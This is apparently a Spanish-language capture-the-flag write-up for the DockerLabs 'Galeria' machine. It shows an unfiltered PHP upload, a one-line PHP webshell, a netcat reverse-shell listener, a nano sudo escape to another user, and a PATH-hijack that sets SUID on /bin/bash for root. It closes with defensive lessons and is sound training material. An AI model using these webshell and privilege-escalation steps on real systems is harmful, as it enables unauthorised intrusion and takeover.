# Galeria — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** Raul A  
**Fecha de creación:** 13/05/2025  
**Técnicas:** Nmap · Dirb · PHP file upload directo · Reverse Shell · nano→gallery/sudo · runme/sudo · PATH hijacking · bash -p

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — directorio /gallery con upload](#2-enumeración-web--directorio-gallery-con-upload)
3. [Upload directo de PHP y Reverse Shell](#3-upload-directo-de-php-y-reverse-shell)
4. [Escalada — www-data → gallery (nano/sudo)](#4-escalada--www-data--gallery-nanosudo)
5. [Escalada — gallery → root (runme/sudo + PATH hijacking)](#5-escalada--gallery--root-runmesudo--path-hijacking)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh galeria.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
|_http-title: Gallery
```

---

## 2. Enumeración web — directorio /gallery con upload

Visitamos `http://172.17.0.2` — galería de imágenes con 6 fotos. No encontramos nada en el código fuente. Lanzamos dirb:

```bash
dirb http://172.17.0.2
```

```
==> DIRECTORY: http://172.17.0.2/gallery/
```

Dentro de `/gallery/` hay un formulario de subida de imágenes. El índice de `/gallery/uploads/` muestra los ficheros ya subidos y un `handler.php`.

---

## 3. Upload directo de PHP y Reverse Shell

Sin ningún filtro activo, subimos directamente una webshell PHP:

```bash
nano shell.php
```

```php
<?php
system($_GET['cmd']);
?>
```

Subimos `shell.php` y la aplicación confirma:

```
Archivo subido exitosamente: shell.php
```

Comprobamos RCE:

```
http://172.17.0.2/gallery/uploads/images/shell.php?cmd=whoami
```

```
www-data
```

Ponemos nc a escuchar y enviamos payload de revshells.com:

```bash
sudo nc -lvnp 443
```

Shell recibida:

```bash
www-data@bc94fd1f2adb:/var/www/html/gallery/uploads/images$ whoami
www-data
```

---

## 4. Escalada — www-data → gallery (nano/sudo)

```bash
www-data@bc94fd1f2adb:/home$ sudo -l
```

```
User www-data may run the following commands on bc94fd1f2adb:
    (gallery) NOPASSWD: /bin/nano
    (www-data) NOPASSWD: /bin/nano
```

GTFObins para nano como usuario gallery:

```bash
www-data@bc94fd1f2adb:/home$ sudo -u gallery /bin/nano
```

Dentro de nano:
1. `Ctrl+R` → `Ctrl+X`
2. Escribir: `reset; sh 1>&0 2>&0`
3. Enter

```bash
$ whoami
gallery
```

---

## 5. Escalada — gallery → root (runme/sudo + PATH hijacking)

```bash
gallery@bc94fd1f2adb:/home$ sudo -l
```

```
User gallery may run the following commands on bc94fd1f2adb:
    (ALL) NOPASSWD: /usr/local/bin/runme
```

Analizamos el binario con `strings`:

```bash
gallery@bc94fd1f2adb:/usr/local/bin$ strings runme
Converting image ...
convert /var/www/html/gallery/uploads/images/input.png ...
Done.
```

El script llama a `convert` sin ruta absoluta. Al ejecutarlo:

```bash
gallery@bc94fd1f2adb:/usr/local/bin$ sudo runme
Converting image ...
sh: 1: convert: not found
Done.
```

Confirma que busca `convert` en el PATH. Creamos un `convert` malicioso en `/tmp`:

```bash
gallery@bc94fd1f2adb:/usr/local/bin$ echo "chmod u+s /bin/bash" > /tmp/convert
gallery@bc94fd1f2adb:/usr/local/bin$ chmod +x /tmp/convert
```

Añadimos `/tmp` al inicio del PATH y ejecutamos runme como sudo:

```bash
gallery@bc94fd1f2adb:/tmp$ export PATH=/tmp:$PATH
gallery@bc94fd1f2adb:/tmp$ sudo /usr/local/bin/runme
Converting image ...
Done.
```

Comprobamos que `/bin/bash` ahora tiene SUID:

```bash
gallery@bc94fd1f2adb:/tmp$ ls -la /usr/local/bin/runme
-rwxr--r-- 1 root gallery 16000 Mar 29 20:36 /usr/local/bin/runme
gallery@bc94fd1f2adb:/tmp$ bash -p
bash-5.2# whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Upload de PHP sin ningún filtro** | `/gallery/uploads` | RCE directo |
| **nano con sudo como usuario gallery** | Sudoers www-data | Escalada horizontal |
| **runme llama a `convert` sin ruta absoluta (PATH hijacking)** | `/usr/local/bin/runme` | Escalada a root |

**Para defenderse:**
- Validar tipo MIME real de los ficheros subidos. Un formulario de galería solo debería aceptar imágenes reales.
- Los scripts que llaman a comandos del sistema deben usar rutas absolutas (`/usr/bin/convert`), nunca relativas.
- Auditar todos los binarios con sudo usando `strings` para detectar llamadas a comandos sin ruta absoluta.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
